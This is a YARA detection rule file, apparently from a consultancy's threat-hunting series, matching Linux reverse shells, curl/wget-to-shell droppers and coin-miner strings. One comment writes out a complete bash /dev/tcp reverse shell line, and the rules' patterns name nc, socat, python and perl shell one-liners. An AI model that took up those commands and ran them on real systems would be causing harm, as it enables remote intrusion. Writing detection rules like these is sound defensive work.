/*
    linux_implants.yar - Halkyn Consulting Friday Threat Hunting series
    ==================================================================
    Original YARA rules for common Linux post-exploitation artefacts:
    reverse shells, fetch-and-run droppers, and coin miners. As with the web
    shell pack, rules lean on distinctive behavioural strings that are rare in
    benign software, and combine tokens where a single string would be noisy.

    Encodes published concepts only; no third-party rule text.
    Licence: MIT. Author: Halkyn Consulting.
*/

rule HALKYN_Revshell_DevTCP
{
    meta:
        author      = "Halkyn Consulting"
        description = "Bash /dev/tcp reverse shell"
        concept     = "interactive shell redirected to /dev/tcp/<host>/<port>"
        severity    = "high"
        family      = "reverse-shell"
        date        = "2026-08"
    strings:
        // e.g. bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
        $devtcp = /\/dev\/tcp\/[0-9a-zA-Z.\-]+\/[0-9]{1,5}/
        $sh_i1 = "bash -i" nocase
        $sh_i2 = "sh -i"   nocase
    condition:
        filesize < 200KB and $devtcp and any of ($sh_i*)
}

rule HALKYN_Revshell_Toolset
{
    meta:
        author      = "Halkyn Consulting"
        description = "Common non-/dev/tcp reverse shell one-liners"
        concept     = "nc -e, socat exec, python/perl socket-to-shell"
        severity    = "high"
        family      = "reverse-shell"
        date        = "2026-08"
    strings:
        $nc_e   = /\bnc(\.traditional)?\s+(-[a-zA-Z]*e|.*\s-e)\s/ nocase
        $socat  = /socat\s+.*exec:.*\b(bash|sh)\b/ nocase
        $py_sock = "import socket"
        $py_pty  = "pty.spawn"
        $py_dup  = "os.dup2("
        $perl_sock = "socket(S,PF_INET" nocase
    condition:
        filesize < 200KB and (
            $nc_e or $socat or $perl_sock or
            ($py_sock and ($py_pty or $py_dup))
        )
}

rule HALKYN_Dropper_FetchPipeShell
{
    meta:
        author      = "Halkyn Consulting"
        description = "Fetch-and-run: a remote download piped straight to a shell"
        concept     = "curl/wget <url> | sh - the classic dropper stage"
        severity    = "high"
        family      = "dropper"
        date        = "2026-08"
    strings:
        // curl ... | sh   /  wget ... | bash   (allowing flags between)
        $fetch_pipe1 = /\b(curl|wget)\b[^\n|]{0,200}\|\s*(ba)?sh\b/ nocase
        // download, then make executable (chmod +x specifically, not any mode),
        // targeting a temp path - the fetch-and-run pattern. Requiring the
        // execute bit avoids matching benign installers that chmod data files.
        $fetch  = /\b(curl|wget)\b/ nocase
        $chmodx = /chmod\s+[augo]*\+x/ nocase
        $tmprun = /\.\/[^\s]+|\/tmp\/[^\s]+/
    condition:
        filesize < 200KB and (
            $fetch_pipe1 or ($fetch and $chmodx and $tmprun)
        )
}

rule HALKYN_Miner_Cryptonight
{
    meta:
        author      = "Halkyn Consulting"
        description = "Coin miner configuration/strings"
        concept     = "stratum pool URLs and miner CLI markers"
        severity    = "high"
        family      = "coinminer"
        date        = "2026-08"
    strings:
        $stratum = "stratum+tcp://" nocase
        $xmrig   = "xmrig"          nocase
        $cn      = "cryptonight"    nocase
        $donate  = "--donate-level" nocase
        $minerd  = "minerd"         nocase
        $pool    = "\"pool\":"      nocase
    condition:
        filesize < 5MB and 2 of them
}
